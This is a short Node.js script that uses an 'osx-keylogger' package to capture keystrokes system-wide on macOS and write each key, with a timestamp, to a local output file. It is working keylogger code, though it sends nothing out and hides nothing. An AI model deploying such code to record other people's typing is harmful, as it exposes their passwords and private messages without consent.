const keylogger = require('osx-keylogger'),
    fs = require('fs');

// shows only the stuff from the keylogger(not stdin) but breaks ctrl+c
// process.stdin.setRawMode(true);



let stream = fs.createWriteStream("output/output_" + Date.now() + ".txt");

let currentModifiers = '';
keylogger.listen((modifiers, key) => {
    stream.write(Date.now() + "," + JSON.stringify(key) +"\n");
}, 'english.json');